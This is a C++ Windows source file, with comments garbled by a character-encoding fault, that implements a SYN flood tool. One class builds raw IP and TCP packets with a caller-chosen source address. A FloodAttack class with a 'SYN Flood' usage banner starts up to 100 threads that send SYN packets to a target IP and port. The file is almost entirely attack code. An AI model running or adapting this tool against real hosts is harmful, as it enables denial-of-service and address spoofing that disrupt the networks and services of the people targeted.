/*
	line : 112 ���ڴ��󣬵��´����߼�����bug��ؽ�������
*/

#pragma once
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32.lib")
#define SEQ 0x28376839
#define BUFFER_SIZE 128

class gss_raw_socket
{
private:

	typedef unsigned short ushort;
	typedef unsigned int uint;
	typedef unsigned char uchar;
	typedef unsigned long ulong;

	// ����tcphdr�ṹ���TCP�ײ�
	typedef struct tcphdr		// TCP�ײ�
	{
		ushort th_srcPort;		// 16λԴ�˿ں�
		ushort th_destPort;		// 16λĿ��˿ں�
		uint th_seq;			// 32λ���к�
		uint th_ack;			// 32λȷ�Ϻ�
		uchar th_lenres;		// 4λ�ײ�����+6λ�������е�4λ
		uchar th_flag;			// 6λ��־λ
		ushort th_win;			// 16λ���ڴ�С
		ushort th_sum;			// 16λУ���
		ushort th_urp;			// 16λ��������ƫ����
	}TCP_HEADER;

	// ����iphdr�ṹ���IP�ײ�
	typedef struct iphdr		// IP�ײ�
	{
		uchar ih_verlen;		// 4λ�ײ����ȡ�4λIP�汾��
		uchar ih_tos;			// 8λ���ͷ���
		ushort ih_total_len;	// 16λ�ܳ���
		ushort ih_ident;		// 16λ��־
		ushort ih_frag_flags;	// 3λ��־λ����SYN��ACK�ȣ�����ƫ����
		uchar ih_ttl;			// 8λ����ʱ��
		uchar ih_proto;			// 8λЭ��
		ushort ih_checksum;		// IP�ײ�У���
		uint ih_srcIP;			// α��IP��ַ
		uint ih_destIP;			// ������IP��ַ
	}IP_HEADER;

	// TCPα�ײ������ڽ���TCPУ��͵ļ��㣬��֤TCPУ�����Ч��
	struct
	{
		ulong ph_srcAddr;		// Դ��ַ
		ulong ph_destAddr;		// Ŀ���ַ
		char ph_mbz;			// �ÿ�
		char ph_ptcl;			// Э������
		ushort ph_tcplen;		// TCP����
	}PSD_HEADER;

	/*
	����У���
	�Ȱ�IP�ײ���У����ֶ���Ϊ0
	Ȼ���������IP�ײ��Ķ����Ʒ���ĺ�
	*/
	ushort checkSum(ushort *buffer, int size)
	{
		ulong ckSum = 0;
		while (size > 1)
		{
			ckSum += *buffer++;
			size -= sizeof(ushort);
		}
		if (size)
		{
			ckSum += *(uchar*)buffer;
		}
		ckSum = (ckSum >> 16) + (ckSum & 0xffff);
		ckSum += (ckSum >> 16);
		return (ushort)(~ckSum);
	}

	SOCKET sock = NULL;
	char sendBuf[BUFFER_SIZE];
	char recvBuf[BUFFER_SIZE];
	struct  sockaddr_in sockAddr;
	TCP_HEADER tcpHeader;
	IP_HEADER ipHeader;
	int seq;
	int errorCode;

	TCP_HEADER* precv_tcpHeader;
	IP_HEADER* precv_ipHeader;

	int init_tcp_ip_header(char* destIP, int destPort, char* srcIP, int srcPort)
	{
		// ����Ŀ���ַ
		memset(&sockAddr, 0, sizeof(sockAddr));
		sockAddr.sin_family = AF_INET;
		//printf("destIP : %s\n", destIP);
		sockAddr.sin_addr.S_un.S_addr = inet_addr(destIP);
		sockAddr.sin_port = htons(destPort);
		// ����IP�ײ�
		ipHeader.ih_verlen = (4 << 4 | sizeof(IP_HEADER) / sizeof(ulong));
		ipHeader.ih_tos = 0;
		ipHeader.ih_total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER));
		ipHeader.ih_ident = 1;
		ipHeader.ih_frag_flags = (1<<6 | 0);
		ipHeader.ih_ttl = 57;

		// ���ô�tcpЭ�� ��wireshark �޷������������ݰ� �� �޷���֤���ݰ�����ȷ��
		ipHeader.ih_proto = IPPROTO_TCP;
		ipHeader.ih_checksum = 0;
		ipHeader.ih_srcIP = inet_addr(srcIP);
		ipHeader.ih_destIP = inet_addr(destIP);
		// ���TCP�ײ�
		tcpHeader.th_srcPort = htons(srcPort);
		tcpHeader.th_destPort = htons(destPort);
		tcpHeader.th_seq = htonl(0);
		tcpHeader.th_ack = 0;
		tcpHeader.th_lenres = (sizeof(TCP_HEADER) / 4 << 4 | 0);
		
		tcpHeader.th_win = htons(16384);
		tcpHeader.th_sum = 0;
		tcpHeader.th_urp = 0;

		PSD_HEADER.ph_srcAddr = ipHeader.ih_srcIP;
		PSD_HEADER.ph_destAddr = ipHeader.ih_destIP;
		PSD_HEADER.ph_mbz = 0;
		PSD_HEADER.ph_ptcl = IPPROTO_TCP;
		PSD_HEADER.ph_tcplen = htons(sizeof(tcpHeader));

		//printf("ipHeader size : %d\n PSD_HEADER size : %d\n tcpHeader size : %d\n", sizeof(ipHeader), sizeof(PSD_HEADER),sizeof(TCP_HEADER));
		return 0;
	}

	template<typename T>
	bool check_error(T errorCode, T valid, char* name)
	{
		if (errorCode == valid)
		{
			printf("\n%s error : %d\n", name, GetLastError());
			return false;
		}
		return true;
	}

	int init_socket()
	{
		int flag = true, timeOut = 2000;
		sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);

		if (!check_error<SOCKET>(sock,INVALID_SOCKET,"WSASocket"))
		{
			return -1;
		}

		// ����IP_HEADER �Ա��Լ����IP�ײ�
		errorCode = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(int));
		if (!check_error(errorCode, SOCKET_ERROR,"setsockopt �����������IP�ײ�"))
		{
			return -1;
		}
		// ���÷��ͳ�ʱ
		errorCode = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeOut, sizeof(timeOut));
		if (!check_error(errorCode, SOCKET_ERROR, "setsockopt ���÷��ͳ�ʱ"))
		{
			return -1;
		}
		// ���ý��ܳ�ʱ
		errorCode = setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeOut, sizeof(timeOut));
		if (!check_error(errorCode, SOCKET_ERROR, "setsockopt ���ý��ܳ�ʱ"))
		{
			return -1;
		}

		return 0;
	}

	int init_sendBuf(uchar flag)
	{
		seq = seq == INT_MAX ? 1 : seq;
		ipHeader.ih_checksum = 0;
		tcpHeader.th_seq = htonl(seq);
		tcpHeader.th_flag = flag; // URG������ָ����Ч����ACK��ȷ�������Ч����PSH�����շ�Ӧ���콫�˱��Ķν���Ӧ�ò㣩��RST���ؽ����ӣ���SYN������һ�����ӣ���FIN���ͷ�һ�����ӣ�
		tcpHeader.th_sum = 0;

		// ��TCPα�ײ���TCP�ײ����Ƶ�ͬһ������������TCPУ���
		memcpy(sendBuf, &PSD_HEADER, sizeof(PSD_HEADER));
		memcpy(sendBuf + sizeof(PSD_HEADER), &tcpHeader, sizeof(tcpHeader));
		tcpHeader.th_sum = checkSum((ushort*)sendBuf, sizeof(PSD_HEADER) + sizeof(tcpHeader));

		//ipHeader.ih_checksum = 0;
		memcpy(sendBuf, &ipHeader, sizeof(ipHeader));
		memcpy(sendBuf + sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
		memset(sendBuf + sizeof(ipHeader) + sizeof(tcpHeader), 1, 4);
		int dataSize = sizeof(ipHeader) + sizeof(tcpHeader);
		ipHeader.ih_checksum = checkSum((ushort*)sendBuf, dataSize);

		//memcpy(sendBuf, &ipHeader, sizeof(ipHeader));

		++seq;

		return 0;
	}

	int init(char* destIP, int destPort, char* srcIP, int srcPort)
	{
		WSADATA wsaData;

		if ((errorCode = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0)
		{
			printf("WSAStartup failed: %d\n", errorCode);
			return -1;
		}
		
		if (init_socket() == -1)
		{
			printf("init_socket failed\n");
		}
		return init_tcp_ip_header(destIP, destPort, srcIP, srcPort);
	}

	int clear()
	{
		if (sock != INVALID_SOCKET && socket != NULL)
		{
			closesocket(sock);
		}
		return WSACleanup();
	}

	int init_recvBuf()
	{
		precv_ipHeader = (IP_HEADER*)recvBuf;
		precv_tcpHeader = (TCP_HEADER*)(recvBuf + sizeof(IP_HEADER));

		return 0;
	}

public:
	typedef struct rawparam
	{
		char* rp_destIP;
		int rp_destPort;
		char* rp_srcIP;
		int rp_srcPort;
		int rp_startSeq;
	}RAW_PARAM;

	gss_raw_socket(char* destIP, int destPort, char* srcIP, int srcPort, int startSeq = 0)
		:seq(startSeq)
	{
		if (init(destIP, destPort, srcIP, srcPort) == -1)
		{
			printf("gss_raw_socket constructor failed!\n");
		}
	}

	~gss_raw_socket()
	{
		clear();
	}
	

	int gss_send(uchar tcp_flag)
	{
		int ret = init_sendBuf(tcp_flag);
		if (!check_error(ret,-1,"init_sendBuf"))
		{
			return -1;
		}
		ret = sendto(sock, sendBuf, 40, 0, (struct sockaddr*)&sockAddr, sizeof(sockAddr));
		if (!(check_error(ret,-1,"sendto")))
		{
			return -1;
		}
		else
		{
			printf("\n srcPort : %d \t destPort : %d sendto sucess \n", tcpHeader.th_srcPort , sockAddr.sin_port);
			return 0;
		}
	}

	int gss_recv()
	{
		memset(recvBuf, 0, BUFFER_SIZE);
		int recvLen = recv(sock, recvBuf, BUFFER_SIZE, 0);
		if (!check_error(recvLen, SOCKET_ERROR,"recv"))
		{
			// ���ճ���
			return -1;
		}
		else if (recvLen == 0)
		{
			// ���ӹر�
			printf("recv close \n");
			return -1;
		}
		else if (recvLen >= 46)
		{
			init_recvBuf();
			return 0;
		}
		return -1;
	}

	bool isDestIP()
	{
		return precv_ipHeader->ih_srcIP == sockAddr.sin_addr.S_un.S_addr;
	}

	// URG������ָ����Ч����ACK��ȷ�������Ч����PSH�����շ�Ӧ���콫�˱��Ķν���Ӧ�ò㣩��RST���ؽ����ӣ���SYN������һ�����ӣ���FIN���ͷ�һ�����ӣ�
	// index�� 1-6��
	bool isSet_TCPFlag(int index)
	{
		return precv_tcpHeader->th_flag &(1 << (6 - index));
	}

	bool isURG()
	{
		return isSet_TCPFlag(1);
	}

	bool isACK()
	{
		return isSet_TCPFlag(2);
	}

	bool isPSH()
	{
		return isSet_TCPFlag(3);
	}

	bool isRST()
	{
		return isSet_TCPFlag(4);
	}

	bool isSYN()
	{
		return isSet_TCPFlag(5);
	}

	bool isFIN()
	{
		return isSet_TCPFlag(6);
	}
};

class FloodAttack
{
private:

	typedef unsigned short ushort;
	typedef unsigned int uint;
	typedef unsigned char uchar;
	typedef unsigned long ulong;

	// �����̲߳���
	typedef struct floodattackthreadparam
	{
		FloodAttack* fatp_this;
		int fatp_threadIndex;
		gss_raw_socket::RAW_PARAM raw_param;
	}FLOODATTACK_THREAD_PARAM;

	static DWORD WINAPI runner(LPVOID lpParam)
	{
		FLOODATTACK_THREAD_PARAM* fatp = (FLOODATTACK_THREAD_PARAM*)lpParam;
		gss_raw_socket raw(fatp->raw_param.rp_destIP, fatp->raw_param.rp_destPort,
			fatp->raw_param.rp_srcIP, fatp->raw_param.rp_srcPort, fatp->raw_param.rp_startSeq);
		
		int errorCode = 0;
		do{
			errorCode = raw.gss_send(2);
			if (errorCode == -1)
			{
				printf("gss_send failed : %d\n", GetLastError());
				return -1;
			}
			display(fatp->fatp_threadIndex);
		} while (false);
		Sleep(20);
		//InterlockedExchangeAdd((long*)mThreadNum, -1);
		//std::cerr << "InterlockedExchangeAdd " << fatp->fatp_threadIndex << "\n";
		return 0;
	}

	int mThreadNum;
	int mMaxThread;
	int mPort;
	char* mDestIP; // Ŀ��IP
	char* mSrcIP;

public:
	// ����״̬��ʾ����
	static void display(int threadIndex)
	{
		static int play = 0;
		// ������
		char *plays[12] =
		{
			" | ",
			" / ",
			" - ",
			" \\ ",
			" | ",
			" / ",
			" - ",
			" \\ ",
			" | ",
			" / ",
			" - ",
			" \\ "
		};
		printf("==%s= %d threads \r", plays[play], threadIndex);
		play = (play + 1) % 12;
	}

	void usage(char *name)
	{
		printf("\t=========================== SYN Flood =======================\n");
		printf("\tusage: %s [src_IP] [dest_IP] [port] [thread]\n", name);
		printf("\tExample: %s 192.168.199.139 192.168.1.1 80 100\n", name);
	}

	FloodAttack()
		:mMaxThread(0), mThreadNum(0) {}
	~FloodAttack(){}

	int run(int argc, char* argv[])
	{
		if (argc != 5)
		{
			usage(argv[0]);
			return 0;
		}
		usage(argv[1]);

		int errorCode = 0;
		printf("mSrcIP : %s", argv[1]);
		mSrcIP = argv[1];
		mDestIP = argv[2];
		printf("mdestIP : %s", mDestIP);
		mPort = atoi(argv[3]);
		mMaxThread = atoi(argv[4]);
		// �߳������Ϊ 100
		mMaxThread = (mMaxThread > 100) ? 100 : mMaxThread;

		
		printf("[start]......   \nPress any key to stop!\n");

		HANDLE* handles = new HANDLE[mMaxThread]();

		while (mThreadNum < mMaxThread) // ѭ�������߳�
		{
			FLOODATTACK_THREAD_PARAM threadParam;
			threadParam.fatp_threadIndex = mThreadNum;
			threadParam.raw_param.rp_destIP = mDestIP;
			threadParam.raw_param.rp_destPort = mPort;
			threadParam.raw_param.rp_srcIP = mSrcIP;
			threadParam.raw_param.rp_srcPort = (mPort + 1024 + mThreadNum +65535) % 65535 + 1;
			threadParam.raw_param.rp_startSeq = mThreadNum + SEQ;
			if ((handles[mThreadNum] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runner, (LPVOID)&threadParam, 0, 0)))
			{
				Sleep(10);
				++mThreadNum;
			}
		}
		printf("\n create finished!\n\r");

		for (int i = 0; i < mMaxThread; ++i)
		{
			WaitForSingleObject(handles[i], INFINITE);
			//printf("\nafter WaitForSingleObject %d\n",i);
		}

		for (int i = 0; i < mMaxThread; ++i)
		{
			CloseHandle(handles[i]);
			//printf("\nafter CloseHandle %d\n", i);
		}
		delete[] handles;
		printf("\n[Stopd]......\n");
		return 0;
	}
};

